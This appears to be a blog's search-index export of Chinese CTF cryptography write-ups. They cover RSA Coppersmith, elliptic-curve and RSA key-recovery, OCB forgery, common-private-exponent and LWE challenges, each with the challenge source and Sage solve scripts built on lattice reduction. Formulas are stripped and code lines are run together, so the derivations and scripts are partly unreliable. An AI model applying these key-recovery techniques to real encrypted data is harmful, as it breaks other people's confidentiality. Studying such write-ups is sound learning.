5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087c = 6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097beta = 0.34delta = 0.02amplification = 2048X = int(N ** delta)Y = int(N ** (delta + beta))M = Matrix( [ [N ** 2 * X ** 3, 0, 0, 0], [e * N * X ** 3, -N * X ** 2 * Y, 0, 0], [e ** 2 * X ** 3, -2 * e * X ** 2 * Y, X * Y ** 2, 0], [e ** 3 * X ** 3, -3 * e ** 2 * X ** 2 * Y, 3 * e * X * Y ** 2, -(Y ** 3)], ])L = M.LLL()[0]x,y = var('x'),var('y')f = x ** 3*(L[0] // X ** 3) + x ** 2 * y * (L[1] // X**2 // Y)+ x * y ** 2 * (L[2] // X // Y ** 2)+ y ** 3 * (L[3] // Y** 3)print(f.factor())'''(144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717*x + 636751972323*y)'''dp = 636751972323k = 144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717 + 1assert (e * dp - 1 ) % k == 0p = (e * dp - 1 ) // k + 1assert N % p == 0q = N // pphi = (p - 1) * (q - 1)d = inverse_mod(e,phi)print(long_to_bytes(pow(c,d,N)))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"http://tearsjin.github.io/tags/Coppersmith/"}]},{"title":"writeup for 2021虎符","date":"2021-04-06T09:29:21.000Z","path":"2021/04/06/writeup-for-2021虎符/","text":"啊太菜了太菜了…打这CTF也有半年了,还是这么菜,好想有一次能ak啊…..两道题一题手快找到资料拿了个三血, 另外一题做了半天都没出来, 有条关系式理解错了真的想锤人…. 0x00 cubicproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from math import gcdfrom functools import reducefrom fractions import Fraction as FracN = 6def read_num(prompt): try: num = int(input(prompt)) except: return 0 return num if num &gt; 0 else 0print(f\"Please give me {N} pairs of positive integers (x,y,z) \" f\"satisfying the equation `x/(y+z) + y/(z+x) + z/(x+y) = {N}`\\n\")anss = []mark = 0for i in range(N): x = read_num(\"[&gt;] x: \") y = read_num(\"[&gt;] y: \") z = read_num(\"[&gt;] z: \") if x * y * z == 0: # positive integer mark = 1 print(\"This is not what i want!\\n\") break if reduce(gcd, [x, y, z]) != 1: # (kx, ky, kz) mark = 1 print(\"This is not what i want!\\n\") break if Frac(x, y+z) + Frac(y, z+x) + Frac(z, x+y) != N: mark = 1 print(\"This is not what i want!\\n\") break ans = tuple(sorted([x, y, z])) # (y, x, z) if ans in anss: mark = 1 print(\"This is not what i want!\\n\") break else: print(\"You are right!\\n\") anss.append(ans)if mark == 0: flag = open('/flag', 'r').read() print(\"flag is: \" + flag + \"\\n\")else: print(\"Something wrong!\\n\") analyses找到6组满足:这题拿到就直接去搜了, 没想到直接出来一篇知乎的文章, 看完之后才知道原来是椭圆曲线….原理什么的里面讲的很清楚了, 这边就不再说了, 只是中间有一个化式子为维尔斯特拉斯形式的过程, 我是误打误撞弄成的(因为公式是同一个, 直接改一下知乎里的就行了), 后来找到了paper - &gt; An unusual cubic representation problem, 才找到具体的公式这里的有了这个我们就能把式子化成的形式了, 这里又有个问题, 该怎么利用上面的式子快速化成我们要的形式呢当然是拿草稿纸算啦 这里可以利用sage的解方程, 解出这个关系式来 12345678a,b,c,x,y = var('a'),var('b'),var('c'),var('x'),var('y')N = 6a=(8*(N+3)-x+y)/(2*(N+3)*(4-x))b=(8*(N+3)-x-y)/(2*(N+3)*(4-x))c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x))f = a^3 + b^3 +c^3 - 9*a*b*c - 5*(a^2*b+a^2*c+b^2*a+b^2*c+c^2*a+c^2*b)print(f.solve(y)[0])# y == -sqrt(x^3 + 213*x^2 + 288*x) 然后利用解出来的参数跟着知乎上的内容写代码就行了, 要知道原理就去知乎看吧, 链接也在上面了 exp12345678910111213141516171819202122232425262728293031323334353637383940a,b,c,x,y = var('a'),var('b'),var('c'),var('x'),var('y')N = 6a=(8*(N+3)-x+y)/(2*(N+3)*(4-x))b=(8*(N+3)-x-y)/(2*(N+3)*(4-x))c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x))f = a^3 + b^3 +c^3 - 9*a*b*c - 5*(a^2*b+a^2*c+b^2*a+b^2*c+c^2*a+c^2*b)print(f.solve(y)[0])ee=EllipticCurve([0,213,0,288,0])P = ee(-200,680)def check(num): return num if num &gt; 0 else 0def orig(P,N): x=P[0] y=P[1] a=(8*(N+3)-x+y)/(2*(N+3)*(4-x)) b=(8*(N+3)-x-y)/(2*(N+3)*(4-x)) c=(-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da=denominator(a) db=denominator(b) dc=denominator(c) l=lcm(da,lcm(db,dc)) return [a*l,b*l,c*l]i = 1arr = []while True: f = True res = orig(i*P,6) for j in res: if check(j) == 0: f = False if f: arr.append(res) i+=1 if len(arr) == 6: breakarr 0x01 simultaneousproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788from functools import reducefrom flag import flagdef encrypt(m, e, n): n = int(n) size = n.bit_length() // 2 m_low = m &amp; ((1 &lt;&lt; size) - 1) m_high = (m &gt;&gt; size) b = (m_low**2 - m_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) return (EC((m_high, m_low)) * e).xy()def decrypt(c, d, n): n = int(n) size = n.bit_length() // 2 c_high, c_low = c b = (c_low**2 - c_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) m_high, m_low = (EC((c_high, c_low)) * d).xy() m_high, m_low = int(m_high), int(m_low) return (m_high &lt;&lt; size) | m_lowdef gen_prime(size): p = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) while p % 3 != 2: p = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) q = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) while q % 3 != 2: q = random_prime(1 &lt;&lt; size, lbound=1 &lt;&lt; (size-1)) if q &gt; p: p, q = q, p return ZZ(p), ZZ(q)SIZE = 512HINTSIZE = 96assert len(flag) == 42flag = int.from_bytes(flag, \"big\")masks = [randint(1 &lt;&lt; (SIZE-1), 1 &lt;&lt; SIZE) for _ in range(3)] # 2^512 bits 三个masked_flag = reduce(lambda a, b: a ^^ b, masks, flag) # 四个一起异或count = 0ciphertexts = []x = random_prime(floor((1&lt;&lt;(2*SIZE-2))**0.373), proof=False) while count &lt; 3: try: p, q = gen_prime(SIZE) n = p * q y = random_prime(floor(n**0.373), proof=False) zbound = -1 * int(((p-q) * round(n ** 0.25) * y) // (3 * (p + q))) z_ = zbound + ((p + 1)*(q + 1)*y - zbound) % x e = ((p + 1) * (q + 1) * y - z_) // x assert (e*x - y*(p+1)*(q+1) == -z_) assert (abs(z_) &lt; abs(zbound)) assert (gcd(x, y) == 1) d = inverse_mod(e, (p+1)*(q+1)) c = encrypt(masks[count], e, n) assert decrypt(c, d, n) == masks[count] ciphertexts.append({ \"n\": n, \"e\": e, \"c\": c, \"hint\": p &amp; ((1&lt;&lt;HINTSIZE)-1) }) count += 1 except KeyboardInterrupt: break except ZeroDivisionError: passprint(\"masked_flag = \", masked_flag)print(\"ciphertexts = \", ciphertexts) analyses用的ECC加密了三个masked_flag, 但基本上没办法从ECC上入手. 回来看前面的密钥生成. 这里每一轮的私钥都是不同的, 每一轮都随机生成素数y, 并利用x,y两个素数生成一个公钥e 因为每轮用的x都是相同的, 而且我们有关系式:化简一下可以有:记为, 可以造出这个一个格子这里的和都够小, 足够规约出结果来.规约出可以求出和 当时做到这里, 被超大的卡住了, 做了一下午都没有想出该怎么用Hint,x,y把p搞出来. (zbound有关的式子被我弄错了!! 没有想到这个zbound虽然被消去但还是有作用的!) 比赛结束以后d33师傅发了一篇paper, 但是不能直接用里面的方法求,(界卡的太死了?) 说是要利用coppersmith的姿势和hint一点一点的把p整出来. 看了一天copper也没啥结果, 只能等wp了. 出来了再好好看看到底该怎么调coppersmith 后来翻虎符wp翻到一篇wp里面有一个二分法的方法, 看完才发现原来自己一直把zbound的式子搞错了… 不过就算没搞错自己也可能想不到那个构造方程的方法, 虽然那个方法不算特别复杂, 也算是好好学习了一波 参考这里的二分法先来看一下生成和的等式这里我一开始做的时候忽略了一个细节, 是小于的! 而是略大于的,那么会有第二项, 也就是省略掉的那个项是小于的, 所以这个约等于两边其实是非常非常接近的. 我们上面计算了, 再根据式, 就可以有我们可以把后面的先忽略, 因为它的影响并不大. 我们记, 式子会是和的一个关系(其实这里已经式的一个关系式了, 理论上根据已经可以解方程得到的近似了, 但是为了计算上的方便, 才看成和移项, 并利用,可以把式子化成一个关于的方程但是前面用了太多的近似, 导致这个方程的解会偏离真正的并且不再是整数解(这里我试了sage自带的解方程, 可能是我姿势不对, 解出来的结果再取整并不是正确的), 观察到当和的时候左边的式子是异号的, 这个时候就可以利用高中的知识! 根存在性定理, 并用二分法去逼近一个靠近解的整数. 而这个, 利用这个就可以大概率的解出了 因为只是个近似, 而且求出来还可能是奇数, 所以需要前后调一下, 比如+1 -1 +2 -2 等等关于为啥不能是奇数, 怎么会是奇数呢hhh 至此, 我们成功的算出了, 所有的参数包括私钥也都可以求出来了, 再利用题目自带的解密算法解密就行了. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# sagemathfrom gmpy2 import *from Crypto.Util.number import long_to_bytes as l2bdef find_p_puls_q(f,k): s = 0 b = k for i in range(2000): a = (s+b) // 2 if f.subs(x==a) &gt; 0: s = a else: b = a return adef find_p(pq,n): p = var('p') if pq^2 - 4*n&lt;0: return [] f = p^2 - pq*p+n r = f.roots() res = [] for i in r: if i[0]&gt;0: res.append(int(i[0])) return (res[0],res[1])def decrypt(c, d, n): n = int(n) size = n.bit_length() // 2 c_high, c_low = c b = (c_low**2 - c_high**3) % n EC = EllipticCurve(Zmod(n), [0, b]) m_high, m_low = (EC((c_high, c_low)) * d).xy() m_high, m_low = int(m_high), int(m_low) return (m_high &lt;&lt; size) | m_lowmasked_flag = 10629883656219490982178951599484437698263214790268091560719514148215968944141123323489358824379735126966804354267426040231682908197526817342035901781691470ciphertexts = [...]PK = []N = [ciphertexts[0]['n'],ciphertexts[1]['n'],ciphertexts[2]['n']]E = [ciphertexts[0]['e'],ciphertexts[1]['e'],ciphertexts[2]['e']]C = [ciphertexts[0]['c'],ciphertexts[1]['c'],ciphertexts[2]['c']]M=iroot(int(N[0]),2)[0]a=[0]*4a[0]=[M,E[0],E[1],E[2]]a[1]=[0,-N[0],0,0]a[2]=[0,0,-N[1],0]a[3]=[0,0,0,-N[2]]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()x = int(abs(Mat_LLL[0][0])//M)assert x * M == abs(Mat_LLL[0][0])S=[Mat_LLL[0][1],Mat_LLL[0][2],Mat_LLL[0][3]]A=[round(N[0]^0.25)^2,round(N[1]^0.25)^2,round(N[2]^0.25)^2]assert (E[0] * x - S[0]) % N[0] == 0assert (E[1] * x - S[1]) % N[1] == 0assert (E[2] * x - S[2]) % N[2] == 0Y = [0,0,0]for i in range(3): Y[i] = (E[i]*x - S[i]) // N[i]KK = [0,0,0]for i in range(3): KK[i] = (E[i] * x -Y[i] * N[i] ) // Y[i]x = var('x')FF = [0,0,0]for i in range(3): FF[i] = (3*(KK[i]-1)*x-3*x^2)^2 - A[i]*(x^2-4*N[i])ppq1 = find_p_puls_q(FF[0],KK[0])ppq2 = find_p_puls_q(FF[1],KK[1])ppq3 = find_p_puls_q(FF[2],KK[2])p1,q1 = find_p(ppq1+1,N[0])p2,q2 = find_p(ppq2+1,N[1])p3,q3 = find_p(ppq3+1,N[2])d1,d2,d3 = inverse_mod(E[0],(p1+1)*(q1+1)),inverse_mod(E[1],(p2+1)*(q2+1)),inverse_mod(E[2],(p3+1)*(q3+1))l2b(decrypt(C[0],d1,N[0])^^decrypt(C[1],d2,N[1])^^decrypt(C[2],d3,N[2])^^masked_flag)","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"ECC","slug":"ECC","permalink":"http://tearsjin.github.io/tags/ECC/"}]},{"title":"Finding Small Solutions to Small Degree Polynomials","date":"2021-04-04T07:57:17.000Z","path":"2021/04/04/Finding-Small-Solutions-to-Small-Degree-Polynomials/","text":"Finally, Coppersmith! Finding Small Solutions to Small Degree PolynomialsUnivariate Modular PolynomialThe definition of “small roots”: All integers such that and , where B is a suitable bound of and is a univariate polynomial of small degree, is a modulus of unknown factorization. We assume is monic and the gcd of its coefficients be relatively prime to . We set:The first approach is essentially due to Hastad. We can take attention to one collection of polynomials:For each polynomials , and all small root , is an integer. The same will be the true of any integer linear combination of polynomials in . And we can get a latticeApply lattice basis reduction. Because has dimension and determinant , we will find a nonzero vector of lengthwhere is a constant depending on the dimension. We interpret a vector 𝕧 as a polynomial . I can not understand …to be continued","tags":[{"name":"Reading","slug":"Reading","permalink":"http://tearsjin.github.io/tags/Reading/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"http://tearsjin.github.io/tags/Coppersmith/"}]},{"title":"writeup for 2020 红明谷杯","date":"2021-04-02T11:35:01.000Z","path":"2021/04/02/writeup-for-2020-红明谷杯/","text":"虎符前的一个比赛, 号都没注册, 借隔壁宿舍的号玩了一下. 密码一共就三题, 一题AES-OCB难爆(反正我是第一次知道OCB这个模式), 国内居然搜不到关于OCB的资料. 只找到一两个paper, 没这个耐心看. 剩下两题, 一题签到(估计是非预期才这么简单), 还有一道La爷爷那边有记录, 就直接做了. 0x00 babyForgeryproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#!/usr/bin/env python3# -*- coding: utf-8 -*-import osimport stringimport randomimport socketserverimport signalfrom hashlib import sha256from ocb.aes import AES # https://github.com/kravietz/pyOCBfrom ocb import OCBFLAG = #####REDACTED#####BLOCKSIZE = 16MENU = br\"\"\"[1] Encrypt[2] Decrypt[3] Get Flag[4] Exit\"\"\"class Task(socketserver.BaseRequestHandler): def _recvall(self): pass def send(self, msg, newline=True): pass def recv(self, prompt=b'&gt; '): pass def recvhex(self, prompt=b'&gt; '): pass def proof_of_work(self): pass def timeout_handler(self, signum, frame): pass def encrypt(self, nonce, message, associate_data=b''): assert nonce not in self.NONCEs self.NONCEs.add(nonce) self.ocb.setNonce(nonce) tag, cipher = self.ocb.encrypt(bytearray(message), bytearray(associate_data)) return (bytes(cipher), bytes(tag)) def decrypt(self, nonce, cipher, tag, associate_data=b''): self.ocb.setNonce(nonce) authenticated, message = self.ocb.decrypt( *map(bytearray, (associate_data, cipher, tag)) ) if not authenticated: raise ValueError('REJECT') return bytes(message) def handle(self): signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(60) if not self.proof_of_work(): return aes = AES(128) self.ocb = OCB(aes) KEY = os.urandom(BLOCKSIZE) self.ocb.setKey(KEY) self.NONCEs = set() while True: USERNAME = self.recv(prompt=b'Enter username &gt; ') if len(USERNAME) &gt; BLOCKSIZE: self.send(b\"I can't remember long names\") continue if USERNAME == b'Alice': self.send(b'Name already used') continue break signal.alarm(60) while True: self.send(MENU, newline=False) try: choice = int(self.recv(prompt=b'Enter option &gt; ')) if choice == 1: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') message = self.recvhex(prompt=b'Enter message &gt; ') associate_data = b'from ' + USERNAME ciphertext, tag = self.encrypt(nonce, message, associate_data) self.send(str.encode(f\"ciphertext: {ciphertext.hex()}\")) self.send(str.encode(f\"tag: {tag.hex()}\")) elif choice == 2: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') ciphertext = self.recvhex(prompt=b'Enter ciphertext &gt; ') tag = self.recvhex(prompt=b'Enter tag &gt; ') associate_data = self.recvhex(prompt=b'Enter associate data &gt; ') message = self.decrypt(nonce, ciphertext, tag, associate_data) self.send(str.encode(f\"message: {message.hex()}\")) elif choice == 3: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') ciphertext = self.recvhex(prompt=b'Enter ciphertext &gt; ') tag = self.recvhex(prompt=b'Enter tag &gt; ') associate_data = b'from Alice' message = self.decrypt(nonce, ciphertext, tag, associate_data) if message == b'please_give_me_the_flag': self.send(FLAG) elif choice == 4: break else: break except: self.send(b'Error!') break signal.alarm(0) self.send(b'Bye!') self.request.close()class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 10000 print(HOST, PORT) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 不重要的函数用pass省略了 analyses 全场只有一解的题, 真的不会, 等wp学习了 0x01 RSA attackproblem123456789101112131415161718192021222324252627282930313233343536from gmpy2 import *from Crypto.Util.number import *import sympyimport randomfrom secret import flagp1 = getPrime(1024)print(p1)#p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031p2 = p1 - random(999,99999)print(p2)#p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034p_1=1for i in range(1,p1+1): p_1*=ip3 = sympy.nextPrime(p_1 % p2 )p4 = p3 &gt;&gt; 50 &lt;&lt; 50p = p4while(isPrime(P)!=1): P = p + random.randint(0,2**50)Q = getPrime(1024)e = 1+1+1N = P * Qprint(N)#N=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793flag=bytes_to_long(flag)c = pow(flag,e,N)print(c)#c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413 analyse我估计着这是非预期看完一遍代码就知道是已知高位求了, 可惜这题目跟新生赛的题一个尿性, 没有对进行padding, 导致可以直接对开3次方…… 非预期exp1234from gmpy2 import irootfrom Crypto.Util.number import long_to_bytesc = 15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413print(long_to_bytes(iroot(c,3)[0])) 预期解威尔逊定理???? 题目是不是搞错了, p2&lt;p1, 那么阶乘的时候肯定有p2在p_1里面…. 模p2直接是0了 ???????????? 0x02 ezCRTproblem1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import gmpy2from random import shuffleflag = b\"flag is here\"def shuffle_flag(s): str_list = list(s) shuffle(str_list) return ''.join(str_list)nl = []el = []count = 0while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1print(nl)print(el)cl = []flag = shuffle_flag(flag.decode()).encode()for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i]))print(cl) analysesCommon Private Exponent -&gt; https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf 当私钥满足其中为最大的, 就可以使用这个方法 我们可以记, 且 因为每次用的都是同一个私钥, 那么可以有: 可以构造格子规约出来后, 取第一行第一个就是了.计算出就是flag了 exp12345678910111213141516171819202122232425262728#sagemathfrom gmpy2 import *from Crypto.Util.number import long_to_bytes as l2bN = [...]E = [...]PK = []for i,j in zip(N,E): PK.append([i,j])for i in range(len(PK)): for j in range(i,len(PK)): if PK[j][0] &gt; PK[i][0]: PK[j],PK[i] = PK[i] ,PK[j]PK = PK[::-1]M=iroot(int(PK[-1][0]),int(2))[0]a=[0]*6a[0]=[M,PK[0][1],PK[1][1],PK[2][1],PK[3][1],PK[4][1]]a[1]=[0,-PK[0][0],0,0,0,0]a[2]=[0,0,-PK[1][0],0,0,0]a[3]=[0,0,0,-PK[2][0],0,0]a[4]=[0,0,0,0,-PK[3][0],0]a[5]=[0,0,0,0,0,-PK[4][0]]Mat = matrix(ZZ,a)Mat_LLL=Mat.BKZ()d = int(abs(Mat_LLL[0][0])//M)assert d * M == abs(Mat_LLL[0][0])l2b(d)","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"AES","slug":"AES","permalink":"http://tearsjin.github.io/tags/AES/"},{"name":"OCB","slug":"OCB","permalink":"http://tearsjin.github.io/tags/OCB/"}]},{"title":"The learning of LWE","date":"2021-03-31T10:56:47.000Z","path":"2021/03/31/The-learning-of-LWE/","text":"做Ant&amp;d3的时候发现自己Lattice还不会, 所以就去学了一波Lattice, 顺便就了解了一下LWE, 发现这玩意居然有三次比赛用的都是同一个板子, 也每个都去做了分析了一下, 然后就集中在这里了. 感谢一位大大大大大师傅详细的wp，我才能这么快的明白原理，指路 —-&gt; https://blog.soreatu.com/ X-NUCA Diamond题目1234567891011121314151617181920212223242526272829303132#!/usr/bin/env sageimport osfrom hashlib import sha256from Crypto.Cipher import AESfrom sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer import DiscreteGaussianDistributionIntegerSampler as DGDISfrom secret import FLAGassert FLAG.startswith(b\"X-NUCA{\") and FLAG.endswith(b\"}\")A = random_matrix(ZZ, 320, 5, x = 10, y = 1000)B = Matrix(A * vector([randint(1, 2^1024) for _ in range(5)]) for _ in range(7))L = LWE(n = 25, q = 1000, D = DGDIS(3))S = [L() for _ in range(64)]M = Matrix(64, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), (Matrix([x for x, _ in S])).list())])T = Matrix([randint(1, 2^1024) for _ in range(64)])R = T.transpose().stack(T * vector([y for _, y in S]).change_ring(ZZ))if __name__ == \"__main__\": key = sha256(''.join(list(map(str, L._LWE__s))).encode()).digest() iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ct = cipher.encrypt(FLAG) f = open(\"output.txt\", \"wb\") f.write(str(B.list()).encode() + b'\\n') f.write(str(M.list()).encode() + b'\\n') f.write(str(R.list()).encode() + b'\\n') f.write((iv + ct).hex().encode()) f.close() 一些新见到的函数 random_matrix(ZZ, 5, 320, x = 10, y = 1000): 随机生成一个整数的矩阵, 其元素的取值范围是也就是 LWE(n = 25, q = 1000, D = DGDIS(3)): 生成一个25维 的LWE对象 D - an error distribution such as an instance of DiscreteGaussianDistributionIntegerSampler stack(): 在末尾添加一行 题目中给出的一些条件 首先是一个320*5的矩阵，乘上了一个随机变换矩阵5*7的矩阵，得到了一个320*7的矩阵B 然后是一个LWE，生成了64组数据，，没有直接给我们和。只给了，以及用作为AES的key，对flag进行了加密。 再就是一个knapsack problem，用长度为64的向量与一个另外一个很大的长度为64的随机向量相乘，得到一个很大的数。给了以及。 knapsack problem这里有一个背包问题其中已知,而且非常大, , 可以由上述式子构造格子则有可以看到是其中一个格点, 而且非常的小, 可以尝试用LLL将其规约出来 123456789101112R = [...]Lattice = [[0 for _ in range(65)] for _ in range(65)]for i in range(65): for j in range(65): if i==j and i!= 64: Lattice[i][j] = 1 if j== 64: Lattice[i][j] = R[i]Lattice[64][64] = -Lattice[64][64]Lattice = Matrix(Lattice)a = Lattice.LLL()[0][:-1]# (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247) 恢复这部分还有些不明白,先放着 LWE 可以将这个等式理解成是一个格子, 是一个线性组合, 那么是一个格点, 是误差, 是一个非格点. LWE就是要找到这么离这个非格点最近的格点. 也就是CVP了 当的长度不是很长的时候, 也就是说维度比较小的时候, 这个CVP还是可以解决的, 而这里的长度是25, 观察一下LWE的式子.熟悉的造格子前的套路, 将式子化为:那么可以构造出等式:先对矩阵进行规约, 得到一个good basis, 再用Babai’s algorithm求解CVP，即可得到离最近的格点。 最后解方程 解出这道题基本上就做完了 下面是Babai’s algorithm的板子 12345678910111213141516171819def BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * \"L\" -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * \"w\" -- a target vector to approach to. OUTPUT: * \"v\" -- a approximate closest vector. Quoted from \"An Introduction to Mathematical Cryptography\": In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - w 总的exp就没写了, 具体的可以参照着下面两题来写, 反正都是一个板子的 2020祥云杯 Easy MatrixProblem1234567891011121314151617181920import numpy as npfrom secret import *def random_offset(size): x = np.random.normal(0, 4.7873, size) return np.rint(x)secret = np.array(list(flag))column = len(list(secret))row = 128prime = 2129matrix = np.random.randint(512, size=(row, column))product = matrix.dot(secret) % primeoffset = random_offset(size=row).astype(np.int64)result = (product + offset) % primenp.save(\"matrix.npy\", matrix)np.save(\"result.npy\", result) 条件读取了matrix后就可以知道column = 42 将flag转成一个1*42的矩阵 来看看过程, 先是生成一个42*128的随机矩阵, 元素都 然后计算, 结果应该是一个的矩阵 继续生成一个1*128随机矩阵 最后计算 题目给了和 分析来看一下加密的式子显然是一个LWE, 现在已知的是和, 要求, 将式子写具体也就是说 老套路, 改写成等式有 解决LWE可以构造格子, 然后用LLL和babai’s nearest plane来解决, 下面就根据等式构造格子 实际上做的时候右边的格子才有用, 左边的不行, 具体原因我也搞不清楚, 问了老师也没问出什么结果 然后就可以用LLL格约出good basis 再用babai’s nearest plane解CVP了 解出CVP也就意味着找到了中的 , 又是已知的, 解方程即可 exp123456789101112131415161718192021222324252627282930313233343536373839404142import numpy as npfrom sage.modules.free_module_integer import IntegerLatticedef BabaisClosestPlaneAlgorithm(L, w): ''' Yet another method to solve apprCVP, using a given good basis. INPUT: * \"L\" -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice. * \"w\" -- a target vector to approach to. OUTPUT: * \"v\" -- a approximate closest vector. Quoted from \"An Introduction to Mathematical Cryptography\": In both theory and practice, Babai's closest plane algorithm seems to yield better results than Babai's closest vertex algorithm. ''' G, _ = L.gram_schmidt() t = w i = L.nrows() - 1 while i &gt;= 0: w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i] i -= 1 return t - wrow = 128col = 42p = 2129M = Matrix(list(np.load('matrix.npy')))R = vector(list(np.load('result.npy')))A = [[0 for _ in range(row)] for _ in range(row)]for i in range(128): for j in range(128): if i==j: A[i][j] = pA = Matrix(A)L = Matrix(A.stack(M.transpose()))lattice = IntegerLattice(L, lll_reduce=True)closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)FLAG = Matrix(Zmod(p), M)flag = FLAG.solve_right(closest_vector)print(''.join( chr(i) for i in flag)) 2020纵横杯 babyLWEproblem1234567891011121314151617181920212223from sage.crypto.lwe import LWEfrom sage.stats.distributions.discrete_gaussian_integer \\ import DiscreteGaussianDistributionIntegerSampler as DGDISimport uuidFLAG = 'flag{' + str(uuid.uuid4()) + '}'FLAG = FLAG.encode().replace(b'-',b'')assert FLAG.startswith(b'flag{') and FLAG.endswith(b'}')s = list(FLAG[5:-1])n = len(s)q = random_prime(1&lt;&lt;512, proof=False, lbound=1&lt;&lt;511)lwe = LWE(n=n, q=q, D=DGDIS(1&lt;&lt;128))lwe._LWE__s = vector(Zmod(q), s)L = [lwe() for _ in range(2*n)]with open('task.txt', 'w') as f: _ = f.write(f\"q = {q}\\n\") _ = f.write(f\"L = {L}\\n\") 分析太离谱了, 一个板子三个比赛用, 这题用的还是X-NUCA Diamond的LWE的板子…但是为了充分理解(就是还没理解)LWE到底是怎么通过格子解出来的 先看看这题造的格子加密的式子还是, 这里的长度32,一共64个式子这里只知道和要求, 思路都是记, 是格子的一个格点, 是格外一个点, 通过对规约找到 再利用最近平面算法解决一个CVP, 也就是找到离最近的向量, 也就是 把再详细点就是那么造出来的格子应该是下面这个矩阵 实际上做题的时候矩阵是上面下面的, 然后还有关于为什么要用64组LWE的问题, 